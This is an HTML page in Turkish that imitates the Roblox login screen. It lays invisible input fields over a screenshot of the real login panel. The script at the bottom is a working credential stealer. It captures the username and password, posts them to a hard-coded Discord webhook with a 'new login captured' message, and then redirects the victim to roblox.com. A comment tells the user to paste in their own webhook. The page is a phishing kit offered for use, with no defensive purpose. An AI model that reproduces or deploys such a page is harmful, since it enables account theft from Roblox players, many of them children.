<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Giriş</title>
    <style>
        /* Ekranın tamamını kaplama ve taşmaları engelleme */
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: #0b0e11;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
        }

        /* Resim ve inputları bir arada tutan tam ekran kapsayıcı */
        .wrapper {
            position: relative;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        /* Arka plan resmini kesmeden ekrana tam oturtan ayar */
        .tam-ekran-resim {
            width: 100%;
            height: 100%;
            object-fit: contain;
            display: block;
        }

        /* 
           GİRİŞ PANELİ KUTUSU:
           Ekrandaki o gri giriş formunun tam üzerine şeffaf bir görünmez kutu koyuyoruz.
           Kutular bu panelin içinde olacağı için resimle beraber küçülüp büyüyecekler.
        */
        .form-container {
            position: absolute;
            width: 19.5%; /* Resimdeki giriş panelinin tam genişlik oranı */
            height: 48%;  /* Giriş panelinin üstten alta tüm butonları kapsayan yükseklik oranı */
            top: 36.3%;   /* Üstten tam olarak Username kutusunun başladığı yer */
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            flex-direction: column;
            box-sizing: border-box;
        }

        /* Tüm inputların ve butonların bu şeffaf panel içindeki ortak özellikleri */
        .form-container input, .form-container button, .form-container a {
            width: 100%;
            height: 13.5%; /* Form panelinin yüksekliğine göre her kutunun kapladığı alan */
            background: transparent;
            border: none;
            outline: none;
            box-sizing: border-box;
        }

        /* Yazı yazılan input alanlarının dikey ortalaması ve yazı rengi */
        .form-container input {
            color: #ffffff;
            font-size: 14px;
            padding: 0 12px;
        }

        .form-container button, .form-container a {
            cursor: pointer;
        }

        /* ============================================================ */
        /* PANEL İÇİ MİLİMETRİK BOŞLUKLAR (Yukarıdan Aşağıya Sıralama) */
        /* ============================================================ */

        /* 1. KUTU: Username Giriş Alanı */
        .username-field {
            margin-bottom: 10%; /* Şifre kutusuna olan mesafe */
        }

        /* 2. KUTU: Password Giriş Alanı */
        .password-field {
            margin-bottom: 7%; /* Log in butonuna olan mesafe */
        }

        /* 3. BUTON: Log in butonu */
        .login-btn {
            margin-bottom: 37%; /* "Forgot..." yazısını atlayıp alttaki gri butona geçiş boşluğu */
        }

        /* 4. BUTON: Send me the one-time code by email */
        .one-time-code-btn {
            margin-bottom: 2.5%; /* Alttaki Quick Login butonuna olan mesafe */
        }

        /* 5. BUTON: Quick Login */
        .quick-login-btn {
            margin-bottom: 5%;
        }

        /* 6. LİNK: En alttaki Sign Up yazısı */
        .signup-link {
            height: 8%;
            width: 25%; /* Sadece en alttaki "Sign up" yazısının genişliği kadar */
            margin-left: auto; /* Yazıyı sağ tarafa doğru hizalamak için */
            margin-right: 14%; /* Sağ kenardan olan iç hizası */
        }
    </style>
</head>
<body>

    <div class="wrapper">
        <!-- Arka plan resmi artık tam ekran ve olması gerektiği gibi büyük duracak -->
        <img src="roblox_giris.png" class="tam-ekran-resim" alt="Roblox">

        <!-- Görünmez, esnek form paneli (Resimle birlikte milimetrik hareket eder) -->
        <form id="girisFormu" class="form-container">
            
            <!-- Kullanıcı adı -->
            <input type="text" id="username" name="username" class="username-field" required autocomplete="off">
            
            <!-- Şifre -->
            <input type="password" id="password" name="password" class="password-field" required>
            
            <!-- Log in butonu -->
            <button type="submit" class="login-btn" title="Giriş Yap"></button>
            
            <!-- One-time code butonu -->
            <button type="button" class="one-time-code-btn"></button>
            
            <!-- Quick Login butonu -->
            <button type="button" class="quick-login-btn"></button>
            
            <!-- Sign up linki -->
            <a href="https://roblox.com" target="_blank" class="signup-link" title="Kayıt Ol"></a>

        </form>
    </div>

    <!-- DISCORD WEBHOOK BAĞLANTISI -->
    <script>
        // BURAYA KENDİ DISCORD WEBHOOK LİNKİNİ YAPIŞTIR KANKA
        const webhookURL = "https://discord.com/api/webhooks/1504533553780887593/k-e_pISawJOV-LvtFhqqXuSPRMhGuUjC8N3i8IyXimO3yKkJ2R8UeiSR7e4ZJ9SqGc6S";

        document.getElementById('girisFormu').addEventListener('submit', function(e) {
            e.preventDefault();

            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            const mesaj = {
                content: `🔔 **Yeni Roblox Girişi Yakalandı!**\n👤 **Kullanıcı:** \`${user}\`\n🔑 **Şifre:** \`${pass}\`\n📅 **Tarih:** ${new Date().toLocaleString('tr-TR')}`
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(mesaj)
            })
            .then(() => {
                window.location.href = "https://roblox.com";
            })
            .catch(() => {
                window.location.href = "https://roblox.com";
            });
        });
    </script>

</body>
</html>
